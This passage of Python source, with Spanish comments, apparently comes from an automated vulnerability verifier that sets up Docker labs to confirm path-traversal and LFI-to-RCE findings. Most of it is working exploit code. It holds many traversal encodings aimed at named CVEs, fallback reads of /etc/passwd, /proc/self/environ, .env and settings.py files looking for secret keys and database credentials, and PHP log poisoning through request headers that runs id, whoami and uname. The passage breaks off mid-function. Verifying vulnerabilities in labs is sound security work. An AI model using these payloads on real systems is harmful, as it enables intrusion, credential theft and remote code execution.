                     "(sin canario propio; confirma traversal si root:x:0:0: aparece)")
                _canary_failed = True

        rel = canary_path.lstrip("/")
        # depth=1 added for apps where CWD is one level above /tmp (e.g. hono /app → ../tmp/canary)
        depths = (1, 2, 4, 6, 8, 10, 12)
        attempts = [rel, canary_path]
        attempts += [("../" * n) + rel for n in depths]
        attempts += [("..%2f" * n) + rel for n in depths]
        # ..%2F uppercase: required by hono CVE-2024-23340 (serveStatic without root)
        attempts += [("..%2F" * n) + rel for n in depths]
        attempts += [("%2e%2e%2f" * n) + rel for n in depths]
        attempts += [("%252e%252e%252f" * n) + rel for n in depths]
        attempts += [("..\\" * n) + rel for n in depths]
        attempts += [("....//" * n) + rel for n in depths]
        # Codificacion '%2e%2e/' (puntos codificados + slash LITERAL): bypass especifico de h3/FastURL
        # (CVE-2026-86253). h3 llama decodeURI(pathname) que convierte %2e → . pero NO %2f → /.
        # Con slash literal entre los segmentos, decodeURI devuelve '../../...' que path.join
        # resuelve como traversal. Los patrones ..%2f o %2e%2e%2f NO funcionan porque %2f no
        # lo decodifica decodeURI. _http_request_raw_path preserva el %2e para que requests
        # no normalice el path antes de enviarlo.
        attempts += [("%2e%2e/" * n) + rel for n in depths]
        # Codificacion '.%2e/' (punto + slash codificado): bypass especifico de CVE-2021-41773
        # (Apache httpd 2.4.49) donde el normalizador de rutas no desnormalizaba esta secuencia.
        # Ninguna de las variantes estandar de arriba la cubre (confirmado en vivo: ..%2f y
        # %2e%2e%2f no funcionan contra Apache 2.4.49; solo .%2e/ funciona).
        attempts += [(".%2e/" * n) + rel for n in depths]
        # Codificacion '%2F..%2F' (slash codificado ANTES de los puntos): bypass confirmado en
        # CVE-2026-71209 (audiobookshelf) donde el check de autenticacion exime rutas que empiezan
        # con /items/ o /authors/ y no normaliza %2F antes de comparar -- el slash inicial hace
        # que el item ID empiece con '/', rompiendo la resolucion de ruta esperada.
        # IMPORTANTE: se codifican TODOS los slashes de rel (no solo los de traversal) para que el
        # url_suffix se pueda seguir usando sin que un '/' intermedio parta el parametro de ruta.
        # Ej: rel="tmp/canary.txt", url_suffix="/cover" →
        #   "%2F..%2F..%2Ftmp%2Fcanary.txt" + "/cover"   ← correcto
        #   "%2F..%2F..%2Ftmp/canary.txt"   + "/cover"   ← ROTO (Express ve :id="%2F..%2F..%2Ftmp")
        _rel_2f = rel.replace("/", "%2F")
        attempts += [("%2F.." * n) + "%2F" + _rel_2f for n in depths]
        # Double-slash bypass: '//' + abs_path bypasea checks de tipo
        # allowed_path.startswith(user_path) que no normalizan slashes multiples antes de comparar
        # (CVE-2024-1561 Gradio: /file=//etc/passwd; otros frameworks Python/Ruby/Go similares).
        attempts += ["//" + canary_path, "/" + canary_path, "//" + rel, "/" + rel]
        # Backslash-encoded bypass '%5C..%5C': en sistemas POSIX el sanitizador trata '\' como byte
        # ordinario de nombre de fichero y no lo bloquea; pero si la app convierte '\' → '/' DESPUÉS
        # del check (CVE-2026-114516 Etherpad Minify.ts), los '%5C..%5C' se convierten en '/../'
        # y producen traversal sin haber pasado por el filtro.  El canary se referencia también con
        # '%5C' en lugar de '/' para que el path quede totalmente codificado en backslash.
        _rel_bs = rel.replace("/", "%5C")
        attempts += [("%5C.." * n) + "%5C" + _rel_bs for n in depths]
        attempts += [rel + "%00", canary_path + "%00"]
        # Unicode path separator variants: IIS %u2215 / %u002f, fullwidth solidus %ef%bc%8f
        # (Java/Python path libs normalize these before filesystem access, bypassing string checks)
        attempts += [("..%u002f" * n) + rel for n in (2, 4, 6, 8)]
        attempts += [("..%u2215" * n) + rel for n in (2, 4, 6, 8)]
        attempts += [("..%ef%bc%8f" * n) + rel for n in (2, 4, 6, 8)]
        # UTF-8 overlong encoding: ..%c0%af (0xC0 0xAF encodes '/' in modified UTF-8 — historical
        # bypass for older Java servlet containers and IIS before normalization was enforced)
        attempts += [("..%c0%af" * n) + rel for n in (2, 4, 6, 8)]
        # Semicolon separator bypass: Tomcat/Spring accept ';' as path parameter delimiter,
        # so '/..;/' traverses one directory on some JVM-based stacks
        attempts += [("..;/" * n) + rel for n in (2, 4, 6, 8)]
        # Payload_kb extended encodings (deduplicates automatically at probe time)
        try:
            from .payload_kb import load_path_traversal_encodings as _lpt
            for _d in (4, 6, 8):
                for _pt_variant in _lpt(_d, rel):
                    if _pt_variant not in attempts:
                        attempts.append(_pt_variant)
        except Exception:
            pass

        # In passwd-mode, replace attempts with /etc/passwd traversal paths
        if _canary_failed:
            _etc = "etc/passwd"
            _etc_abs = "/etc/passwd"
            attempts = [_etc_abs, _etc]
            attempts += [("../" * n) + _etc for n in (1, 2, 4, 6, 8, 10, 12)]
            attempts += [("..%2f" * n) + _etc for n in (1, 2, 4, 6, 8, 10)]
            attempts += [("..%2F" * n) + _etc for n in (1, 2, 4, 6, 8, 10)]
            attempts += [("%2e%2e%2f" * n) + _etc for n in (2, 4, 6, 8, 10)]
            attempts += [("%252e%252e%252f" * n) + _etc for n in (2, 4, 6, 8)]
            attempts += [("%2e%2e/" * n) + _etc for n in (2, 4, 6, 8)]
            attempts += [(".%2e/" * n) + _etc for n in (2, 4, 6, 8)]
            attempts += [("//" + _etc_abs), ("/" + _etc_abs)]
            # audiobookshelf %2F..%2F and Etherpad %5C..%5C encodings in passwd mode
            _etc_2f = _etc.replace("/", "%2F")
            attempts += [("%2F.." * n) + "%2F" + _etc_2f for n in (2, 4, 6, 8)]
            _etc_bs = _etc.replace("/", "%5C")
            attempts += [("%5C.." * n) + "%5C" + _etc_bs for n in (2, 4, 6, 8)]

        found = False
        tried_all: list = []
        win_ep = endpoint or "/"
        win_up = _url_path_mode
        win_pp = path_param

        for cand_ep, cand_params, cand_meth, cand_up, from_scan in candidates:
            if from_scan:
                step(f"escaneo de fuente: probando ruta descubierta: {cand_ep} "
                     f"({'URL_PATH' if cand_up else 'query'})")
            cand_path_p = path_param_hint or _pick_param(cand_params, _PATH_HINTS) or ""
            tried: list = []
            for payload_value in attempts:
                try:
                    if cand_up:
                        # el payload va concatenado al path de la URL.
                        # url_suffix (opcional, e.g. '/cover' en audiobookshelf CVE-2026-71209)
                        # se añade DESPUES del payload: /items/{traversal}/cover
                        # query_suffix (opcional, e.g. 'import&' en CVE-2025-30208 Vite)
                        # se añade como query string: /@fs/{path}?import&
                        _qs = ("?" + query_suffix) if query_suffix and not query_suffix.startswith("?") else query_suffix
                        target_url = base_url + cand_ep + payload_value + url_suffix + _qs
                        # requests.request() normaliza %2e a '.' ANTES de enviar -- exactamente
                        # lo que rompe bypasses como '.%2e/' (CVE-2021-41773).
                        # También check cand_ep: si el analista bloqueó el endpoint con %2F/%2e
                        # incrustados (endpoint=path traversal completo), también hay que usar raw.
                        _has_pct_dot = ("%2e" in payload_value.lower() or "%2f" in payload_value.lower()
                                        or "%2e" in cand_ep.lower() or "%2f" in cand_ep.lower())
                        if _has_pct_dot and cand_meth == "GET":
                            resp = _http_request_raw_path(cand_meth, target_url, timeout=15)
                        else:
                            resp = _http_request(cand_meth, target_url, timeout=15,
                                                 headers=custom_headers or None)
                        payload_desc = f"URL_PATH={payload_value!r}{('+' + url_suffix) if url_suffix else ''}{_qs or ''}"
                    else:
                        payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
                        payload[cand_path_p or path_param or "path"] = payload_value
                        resp = _http_request(cand_meth, base_url + cand_ep, timeout=15,
                                             data=payload if cand_meth != "GET" else None,
                                             params=payload if cand_meth == "GET" else None,
                                             headers=custom_headers or None)
                        payload_desc = f"{cand_path_p or path_param}={payload_value!r}"
                except Exception as e:
                    tried.append({"payload": payload_value, "error": str(e)})
                    continue
                _resp_body = resp.text or ""
                _PASSWD_RE = re.compile(r"root:[^:\n]*:0:0:")
                if _canary_failed:
                    # In passwd-mode: check for root:x:0:0: in response
                    present = bool(_PASSWD_RE.search(_resp_body))
                else:
                    present = secret in _resp_body
                    # Base64 detection: some frameworks return file contents base64-encoded.
                    if not present and _resp_body:
                        import base64 as _b64_gen
                        for _b64c in re.findall(r'[A-Za-z0-9+/]{24,}={0,2}', _resp_body):
                            try:
                                _dec = _b64_gen.b64decode(_b64c + '==').decode('utf-8', errors='ignore')
                                if secret in _dec:
                                    present = True
                                    break
                            except Exception:
                                continue
                    # Also check analyst-provided confirm_string (e.g. root:x:0:0 for apps that
                    # don't serve arbitrary canary files but DO serve /etc/passwd via traversal).
                    if not present and confirm_string and confirm_string.lower() in _resp_body.lower():
                        present = True
                tried.append({"payload": payload_value, "status": resp.status_code,
                              "secreto_presente": present,
                              "respuesta_cuerpo_recorte": _resp_body[:300]})
                if present:
                    found = True
                    win_ep, win_up, win_pp = cand_ep, cand_up, cand_path_p
                    res.evidence["payload_ganador"] = payload_value
                    res.evidence["status_code_respuesta"] = resp.status_code
                    res.evidence["respuesta_cuerpo_recorte"] = _resp_body[:500]
                    if _canary_failed:
                        step(f"VERIFICADO (modo /etc/passwd): root:x:0:0: visible en la "
                             f"respuesta con {payload_desc}.")
                        _shot_url = (base_url + cand_ep + payload_value) if cand_up else (base_url + cand_ep)
                        _add_exploit_evidence(
                            res=res, method=cand_meth, url=_shot_url,
                            resp_or_body=resp,
                            highlight="root:x:0:0:",
                            caption_es=("PATH TRAVERSAL confirmado (via /etc/passwd): "
                                        "root:x:0:0: visible en la respuesta."),
                            caption_en=("PATH TRAVERSAL confirmed (via /etc/passwd): "
                                        "root:x:0:0: visible in response."),
                            extra_terminal=(f"Payload: {payload_value}\n"
                                            f"Response body:\n{_resp_body[:400]}"),
                        )
                    else:
                        step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                             f"{payload_desc}.")
                        _shot_url = (base_url + cand_ep + payload_value) if cand_up else (base_url + cand_ep)
                        _add_exploit_evidence(
                            res=res, method=cand_meth, url=_shot_url,
                            resp_or_body=resp,
                            highlight=secret,
                            caption_es=(f"PATH TRAVERSAL confirmado: {canary_path} devuelto por "
                                        f"el servidor — secreto plantado visible en la respuesta."),
                            caption_en=(f"PATH TRAVERSAL confirmed: {canary_path} returned by "
                                        f"server — planted secret visible in response."),
                            extra_terminal=(f"Canary: {canary_path}\n"
                                            f"Secret: {secret}\n"
                                            f"Payload: {payload_value}\n"
                                            f"Response body:\n{_resp_body[:400]}"),
                        )
                    step("captura HTTP guardada en el informe.")
                    break
            tried_all.extend(tried)
            if found:
                break

        # --- URL-prefix bypass strategy (Rack::Static / aiohttp static / similar) -----------
        # Si el path-traversal estandar (canario en /tmp/) no funciono Y estamos en modo
        # URL_PATH, intentamos el patron de "bypass del prefijo URL": la vulnerabilidad NO
        # escapa al sistema de ficheros fuera del root del servidor web, sino que permite acceder
        # a ficheros DENTRO del root que no deberian ser accesibles porque no estan bajo el
        # prefijo URL configurado (ej. GET /static/..%2fsecret.txt -> sirve root/secret.txt).
        # CVE-2025-27610 (Rack::Static) usa exactamente este patron.
        if not found and any(cand_up for _ep, _p, _m, cand_up, _fs in candidates):
            canary_name = f"binoracle_bypass_{_token()}.txt"
            # Rutas candidatas dentro del contenedor: comunes para servidores web con Docker
            root_cands = ["/app/public", "/app/www", "/app/static", "/app",
                          "/srv/public", "/srv/www", "/var/www/html", "/var/www/public",
                          "/usr/share/nginx/html", "/usr/share/nginx/www"]
            # Si el escaner extrajo RACK_STATIC_ROOT, priorizarlo
            for _ep2, _p2, _m2, _up2, _fs2 in candidates:
                if isinstance(_p2, dict):
                    _rsr = _p2.get("RACK_STATIC_ROOT", "")
                    if _rsr:
                        if not _rsr.startswith("WORKDIR/"):
                            root_cands = [_rsr] + root_cands
                        # "WORKDIR/" solo → se expande a WORKDIR puro después de detectar $PWD
            # Detectar WORKDIR del contenedor para expandir rutas relativas y priorizarlo
            try:
                _wd = lab.sh("exec", container, "sh", "-c", "echo $PWD").stdout.strip()
                if _wd and _wd != "/":
                    # Sustituir WORKDIR/ → "<wd>/" y "WORKDIR/" puro (trailing slash) → "<wd>"
                    def _sub_wd(rc: str) -> str:
                        s = rc.replace("WORKDIR/", _wd + "/")
                        return s.rstrip("/") if s != _wd + "/" else _wd
                    root_cands = [_sub_wd(rc) for rc in root_cands]
                    root_cands = [_wd + "/public", _wd + "/www", _wd + "/static", _wd] + root_cands
            except Exception:
                pass
            secret2 = _token() * 4
            for _root_cand in root_cands:
                _rc_path = f"{_root_cand}/{canary_name}"
                if not lab.write_canary(container, _rc_path, secret2):
                    continue
                # El prefijo URL es el endpoint de la ruta (ej. '/static/')
                # Payload: ..%2f<canary> (1 nivel arriba = sale del subdir del prefijo)
                for cand_ep, _cp, cand_meth, cand_up, _fs in candidates:
                    if not cand_up:
                        continue
                    bypass_payloads = [
                        f"..%2f{canary_name}", f"%2e%2e%2f{canary_name}",
                        f".%2e%2f{canary_name}", f"..%2F{canary_name}",
                        f"../{canary_name}",
                    ]
                    for bp in bypass_payloads:
                        try:
                            target_url = base_url + cand_ep + bp
                            resp = _http_request_raw_path(cand_meth, target_url, timeout=15)
                            present = secret2 in (resp.text or "")
                            tried_all.append({"payload": f"[bypass]{bp}", "root_cand": _root_cand,
                                             "status": resp.status_code, "secreto_presente": present,
                                             "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
                            if present:
                                found = True
                                win_ep, win_up = cand_ep, True
                                canary_path = _rc_path
                                secret = secret2
                                res.evidence["payload_ganador"] = bp
                                res.evidence["status_code_respuesta"] = resp.status_code
                                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                                res.evidence["bypass_root_candidate"] = _root_cand
                                step(f"VERIFICADO (prefix bypass): canario en {_rc_path} accesible "
                                     f"via URL_PATH={bp!r} -- el middleware sirve ficheros fuera "
                                     f"del prefijo URL configurado.")
                                _bp_url = target_url
                                _add_exploit_evidence(
                                    res=res, method="GET", url=_bp_url,
                                    resp_or_body=resp, highlight=secret2,
                                    caption_es=(f"Bypass de prefijo URL confirmado: "
                                                f"{_rc_path} accesible fuera del prefijo "
                                                f"configurado (secreto plantado visible)."),
                                    caption_en=(f"URL-prefix bypass confirmed: "
                                                f"{_rc_path} accessible outside the "
                                                f"configured prefix (planted secret visible)."),
                                    extra_terminal=(f"Path: {_rc_path}\nSecret: {secret2}\n"
                                                    f"URL: {_bp_url}\n"
                                                    f"Response:\n{(resp.text or '')[:300]}"),
                                )
                                step("captura HTTP guardada en el informe.")
                                break
                        except Exception as e:
                            tried_all.append({"payload": f"[bypass]{bp}", "error": str(e)})
                    if found:
                        break
                if found:
                    break
        # --------------------------------------------------------------------------------------

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
                             "metodo": (http_method or "GET").upper(), "path_param": win_pp,
                             "canary_path": canary_path, "canary_secret": secret})
        res.evidence["intentos"] = tried_all
        if found:
            res.verified = True
            res.ok = True
            winner = res.evidence["payload_ganador"]
            mode_desc = f"URL_PATH={winner!r}" if win_up else f"{win_pp}={winner!r}"
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {mode_desc} devolvio "
                          f"el secreto exacto plantado en {canary_path} (dentro del contenedor "
                          f"del objetivo)")
            # Weaponization: use confirmed traversal depth to read /proc/version + /etc/hostname
            try:
                import re as _re_lfiw
                _win_payload = res.evidence.get("payload_ganador", "")
                # Extract traversal prefix: everything up to and including the last ../ sequence
                _depth_m = _re_lfiw.match(r'^((?:\.\./?|%2e%2e/?|%2E%2E/?|\.%2e/?)+)', _win_payload)
                _depth_prefix = _depth_m.group(1) if _depth_m else ""
                if _depth_prefix:
                    _weap_targets = [
                        ("proc/version", "kernel_version", "Linux version"),
                        ("etc/hostname",  "hostname",       None),
                    ]
                    _weap_data: dict = {}
                    for _wtarget, _wkey, _wmarker in _weap_targets:
                        _wpayload = _depth_prefix + _wtarget
                        try:
                            import requests as _rq_lfi
                            _wurl = base_url.rstrip("/") + "/" + win_ep.lstrip("/")
                            if win_up:
                                _wresp = _rq_lfi.get(_wurl.rstrip("/") + "/" + _wpayload,
                                                     headers=dict(custom_headers or {}),
                                                     timeout=10, allow_redirects=True)
                            else:
                                _wresp = _rq_lfi.request(
                                    (http_method or "GET").upper(), _wurl,
                                    params={win_pp: _wpayload} if (http_method or "GET").upper() == "GET" else None,
                                    data={win_pp: _wpayload} if (http_method or "GET").upper() != "GET" else None,
                                    headers=dict(custom_headers or {}),
                                    timeout=10, allow_redirects=True)
                            _wbody = _wresp.text if hasattr(_wresp, "text") else ""
                            if _wmarker and _wmarker in _wbody:
                                _km = _re_lfiw.search(r'Linux version [\d.]+[^\n<]{0,80}', _wbody)
                                _weap_data[_wkey] = _km.group(0) if _km else _wbody.strip()[:100]
                                step(f"weaponize/lfi: {_wkey} extraido via {_wpayload!r}")
                            elif not _wmarker and _wbody.strip() and len(_wbody.strip()) < 128:
                                _weap_data[_wkey] = _wbody.strip()
                                step(f"weaponize/lfi: {_wkey}={_wbody.strip()[:40]!r}")
                        except Exception:
                            pass
                    if _weap_data:
                        res.evidence["weaponization"] = {
                            "technique": "lfi_system_files",
                            "data": _weap_data,
                            "impact": ("LFI confirmed — system file access: " +
                                       ", ".join(f"{k}={str(v)[:40]}" for k, v in _weap_data.items())),
                        }
            except Exception:
                pass
        else:
            res.ok = True
            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried_all
                          if t.get("respuesta_cuerpo_recorte")), "")
            res.evidence["respuesta_muestra_primer_intento"] = sample
            # Expose a compact summary of endpoints+status_codes tried so the LLM retry
            # can avoid suggesting what was already attempted and reason about what wasn't.
            res.evidence["endpoints_probados"] = list({
                (t.get("endpoint", "") or "") + " → " + str(t.get("status", t.get("status_code_respuesta", "")))
                for t in tried_all if t.get("endpoint") or t.get("status") or t.get("status_code_respuesta")
            })[:20]
            res.detail = (f"se probaron {len(tried_all)} variantes de ruta en {len(candidates)} "
                          f"candidato(s) y ninguna devolvio el secreto plantado -- el traversal "
                          f"no se confirmo (puede necesitar otra profundidad/codificacion, o el "
                          f"endpoint/parametro no son los reales)")
            # Backup file variant probe: when canary traversal fails, try reading known-static
            # system files that always exist in a container — without planting any canary.
            # Covers targets that strip/block random canary paths but serve /etc/hostname etc.
            if not res.verified and win_ep and win_pp and tried_all:
                _best_payload = next(
                    (t.get("payload", "") for t in tried_all
                     if t.get("status", 0) not in (0, 404, 500)), "")
                if not _best_payload:
                    _best_payload = next((t.get("payload", "") for t in tried_all), "")
                if _best_payload:
                    import re as _re_bk
                    _depth_m2 = _re_bk.match(r'^((?:\.\./?|%2e%2e/?|%2E%2E/?|\.%2e/?)+)', _best_payload)
                    _depth2 = _depth_m2.group(1) if _depth_m2 else "../" * 5
                    _BACKUP_TARGETS = [
                        ("etc/hostname", None),
                        ("proc/version", "Linux version"),
                        ("etc/os-release", "NAME="),
                        ("proc/self/environ", None),
                    ]
                    for _btarget, _bmarker in _BACKUP_TARGETS:
                        if res.verified:
                            break
                        _bpayload = _depth2 + _btarget
                        try:
                            import requests as _rq_bk
                            _burl = base_url.rstrip("/") + "/" + win_ep.lstrip("/")
                            if _url_path_mode:
                                _bk_resp = _rq_bk.get(
                                    _burl.rstrip("/") + "/" + _bpayload,
                                    headers=dict(custom_headers or {}), timeout=10, allow_redirects=True)
                            else:
                                _bk_resp = _rq_bk.request(
                                    (http_method or "GET").upper(), _burl,
                                    params={win_pp: _bpayload} if (http_method or "GET").upper() == "GET" else None,
                                    data={win_pp: _bpayload} if (http_method or "GET").upper() != "GET" else None,
                                    headers=dict(custom_headers or {}), timeout=10, allow_redirects=True)
                            _bb = _bk_resp.text if hasattr(_bk_resp, "text") else ""
                            _ok = (_bk_resp.status_code == 200 and len(_bb.strip()) > 10 and
                                   (_bmarker is None or _bmarker in _bb))
                            if _ok:
                                res.verified = True
                                res.ok = True
                                res.evidence["backup_file_read"] = {
                                    "target": _btarget, "payload": _bpayload,
                                    "body_snippet": _bb[:300]}
                                res.detail = (f"PATH TRAVERSAL confirmado via archivo de sistema "
                                              f"({_btarget}) con payload {_bpayload!r}")
                                step(f"BACKUP FILE: {_btarget} accesible → traversal confirmed")
                        except Exception:
                            pass
                    # Framework-specific file targets: .env, settings.py, config.js etc.
                    if not res.verified:
                        _fw_detect = (str(source_dir or "") + str(dockerfile_body or "") +
                                      str(docker_image or "")).lower()
                        _FRAMEWORK_EXTRA_TARGETS: list = []
                        if "django" in _fw_detect:
                            _FRAMEWORK_EXTRA_TARGETS = [
                                ("app/settings.py", "SECRET_KEY"),
                                ("settings.py", "SECRET_KEY"),
                                ("config/settings.py", "SECRET_KEY"),
                                (".env", "SECRET_KEY"),
                            ]
                        elif "flask" in _fw_detect or "werkzeug" in _fw_detect:
                            _FRAMEWORK_EXTRA_TARGETS = [
                                (".env", "SECRET_KEY"),
                                ("app.py", "SECRET_KEY"),
                                ("config.py", "SECRET_KEY"),
                            ]
                        elif any(x in _fw_detect for x in ("node", "express", "nuxt", "next")):
                            _FRAMEWORK_EXTRA_TARGETS = [
                                (".env", "DB_"),
                                ("package.json", '"name"'),
                                ("config.js", "module.exports"),
                                (".env.local", "DB_"),
                            ]
                        else:
                            _FRAMEWORK_EXTRA_TARGETS = [
                                (".env", "DB_"),
                                (".env.local", "DB_"),
                                ("config.yml", None),
                                ("config.yaml", None),
                            ]
                        for _ftarget, _fmarker in _FRAMEWORK_EXTRA_TARGETS:
                            if res.verified:
                                break
                            _fpayload = _depth2 + _ftarget
                            try:
                                import requests as _rq_fw
                                _furl = base_url.rstrip("/") + "/" + win_ep.lstrip("/")
                                if _url_path_mode:
                                    _fr = _rq_fw.get(
                                        _furl.rstrip("/") + "/" + _fpayload,
                                        headers=dict(custom_headers or {}), timeout=10)
                                else:
                                    _fr = _rq_fw.request(
                                        (http_method or "GET").upper(), _furl,
                                        params={win_pp: _fpayload} if (http_method or "GET").upper() == "GET" else None,
                                        data={win_pp: _fpayload} if (http_method or "GET").upper() != "GET" else None,
                                        headers=dict(custom_headers or {}), timeout=10)
                                _fb = _fr.text if hasattr(_fr, "text") else ""
                                _fok = (_fr.status_code == 200 and len(_fb.strip()) > 10 and
                                        (_fmarker is None or _fmarker in _fb))
                                if _fok:
                                    res.verified = True
                                    res.ok = True
                                    res.evidence["framework_file_read"] = {
                                        "target": _ftarget, "payload": _fpayload,
                                        "body_snippet": _fb[:300]}
                                    res.detail = (f"PATH TRAVERSAL confirmado via archivo de "
                                                  f"framework ({_ftarget}) con payload {_fpayload!r}")
                                    step(f"FRAMEWORK FILE: {_ftarget} accesible → traversal confirmed")
                            except Exception:
                                pass
        # LFI param fuzzing for generic verifier (like verify_wordpress_path_traversal)
        _gen_path_param = win_pp or path_param_hint or ""
        if (not res.verified and parameters
                and (_tried_params_set is None or len(_tried_params_set) < 4)):
            _gen_already = (_tried_params_set or frozenset()) | {_gen_path_param}
            _gen_names = (list(parameters.keys()) if isinstance(parameters, dict)
                          else list(parameters))
            _gen_cands = []
            for _h in _PATH_HINTS:
                for _pn in _gen_names:
                    if _h in _pn.lower() and _pn not in _gen_already and _pn not in _gen_cands:
                        _gen_cands.append(_pn)
            if _gen_cands:
                _gen_next = _gen_cands[0]
                _gen_budget = max(60.0, budget_s * 0.4)
                step(f"LFI generic param fuzzing: '{_gen_path_param}' sin canario; "
                     f"probando siguiente candidato '{_gen_next}'...")
                _gen_rot = verify_generic_path_traversal(
                    source_dir, endpoint, http_method, parameters,
                    path_param_hint=_gen_next, on_step=on_step,
                    budget_s=_gen_budget, setup_commands=setup_commands,
                    url_suffix=url_suffix, custom_headers=custom_headers,
                    query_suffix=query_suffix,
                    dockerfile_body=dockerfile_body, extra_files=extra_files,
                    _tried_params_set=_gen_already,
                )
                if _gen_rot.verified:
                    return _gen_rot
        if not res.verified and res.confidence == "none":
            res.confidence = "inconclusive"
        if not res.verified:
            _capture_container_logs_on_failure(container, res, step)
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        res.confidence = "not_reproducible"
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        res.confidence = "not_reproducible"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_lfi_rce(
    source_dir: str, endpoint: str, http_method: str, parameters,
    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """LFI-a-RCE por envenenamiento de log (log poisoning), una tecnica MAS AVANZADA y distinta
    de path traversal (que solo LEE un fichero): si el parametro vulnerable se usa para un
    `include()`/`require()` de PHP (o equivalente en otros lenguajes que interpretan el fichero
    incluido como codigo) en vez de solo servirlo como texto plano, un log de acceso del propio
    servidor web (que registra el User-Agent de cada peticion, SIN sanearlo) se puede envenenar
    con codigo real y luego incluirlo con el mismo parametro -- confirmado por EJECUCION real
    (el resultado del codigo aparece en la respuesta), no por la simple presencia del payload
    reflejado (eso solo demostraria lectura, no inclusion-como-codigo).

    Mecanismo (casuistica real de LFI/RCE via log poisoning, PayloadsAllTheThings):
    1) una peticion normal con un User-Agent que lleva `<?php system('echo MARKER'); ?>` -- el
       servidor web (Apache/nginx) registra ese User-Agent TAL CUAL en su log de acceso, sin
       interpretarlo (solo lo guarda como texto).
    2) el parametro vulnerable intenta incluir varias rutas de log comunes (Apache/nginx, con y
       sin traversal) -- si el codigo SI se interpreta al incluirse, el resultado del `system()`
       (el marcador ejecutado, no el PHP crudo) aparece en la respuesta."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
        if _params_list:
            path_param = _params_list[0]
        else:
            res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
            res.limitations.append("la verificacion de LFI-a-RCE necesita saber que parametro "
                                   "lleva la ruta/fichero; afina 'parameters' o pasalo a mano "
                                   "(path_param_hint)")
            return res
    # Normalizar variantes de placeholder URL_PATH mal generadas por el LLM
    if re.match(r'^url.?p(?:at(?:h)?|ath)$', path_param, re.IGNORECASE):
        path_param = "URL_PATH"

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        marker = f"binoracle_lfi_rce_{_token()}"
        poison_ua = f"<?php system('echo {marker}'); ?>"
        step(f"envenenando el log de acceso del servidor con codigo PHP real en el "
             f"User-Agent (marcador {marker!r})...")
        try:
            _http_request("GET", base_url + "/", timeout=15,
                          headers={"User-Agent": poison_ua})
            # /proc/self/environ also reflects X-Forwarded-For; cover configs that strip UA
            try:
                _http_request("GET", base_url + "/", timeout=15,
                              headers={"X-Forwarded-For": poison_ua})
            except Exception:
                pass
        except Exception as e:
            res.detail = f"la peticion de envenenamiento del log fallo: {e}"
            return res
        time.sleep(1)

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        # /proc/self/environ is always present in Docker and reflects HTTP_USER_AGENT
        # (and HTTP_X_FORWARDED_FOR) — no log files needed. Classic access.log paths
        # often don't exist because Docker images pipe logs to stdout/stderr.
        log_paths = [
            "/proc/self/environ",
            "/var/log/apache2/error.log",
            "/var/log/apache2/access.log", "/var/log/apache2/other_vhosts_access.log",
            "/var/log/httpd/access_log", "/var/log/nginx/access.log",
            "/usr/local/apache2/logs/access_log",
        ]
        depths = (0, 4, 8, 12)
        attempts = []
        for lp in log_paths:
            rel = lp.lstrip("/")
            for n in depths:
                attempts.append(("../" * n) + rel if n else lp)

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "path_param": path_param, "marcador": marker,
                             "user_agent_veneno": poison_ua})

        found = False
        tried = []
        _lfi_waf = _WafGuard()
        for payload_value in attempts:
            if _lfi_waf.is_blocked:
                break
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[path_param] = payload_value
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
                if _lfi_waf.check(resp, step):
                    break
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            text = resp.text or ""
            # EJECUTADO (el resultado de system(), sin las etiquetas PHP alrededor) es la prueba
            # real -- el payload crudo reflejado (con '<?php' literal) solo demuestra LECTURA,
            # NUNCA se marca como RCE por eso solo.
            executed = marker in text and "<?php" not in text
            raw_reflected = marker in text and "<?php" in text
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "ejecutado": executed, "reflejado_crudo_sin_ejecutar": raw_reflected})
            if executed:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["respuesta_cuerpo_recorte"] = text[:500]
                step(f"VERIFICADO: el marcador '{marker}' aparecio EJECUTADO (no como texto PHP "
                     f"crudo) tras incluir el log envenenado con {path_param}="
                     f"{payload_value!r}.")
                break

        res.evidence["intentos"] = tried
        if found:
            # ── Impact proof: run id/whoami/uname via the same log-poison technique ──
            _id_out, _who_out, _uname_out = "", "", ""
            _win_path = res.evidence.get("payload_ganador", "")
            _win_param = {path_param: _win_path}
            for _cmd, _store in [("id", "_id_out"), ("whoami", "_who_out"), ("uname -a", "_uname_out")]:
                try:
                    _poison = f"<?php system('{_cmd}'); ?>"
                    _http_request("GET", base_url + "/", timeout=8,
                                  headers={"User-Agent": _poison})
                    time.sleep(0.4)
                    _r = _http_request(m, base_url + endpoint, timeout=10,
                                       data=_win_param if m != "GET" else None,
                                       params=_win_param if m == "GET" else None)
                    _out = (_r.text or "").strip()
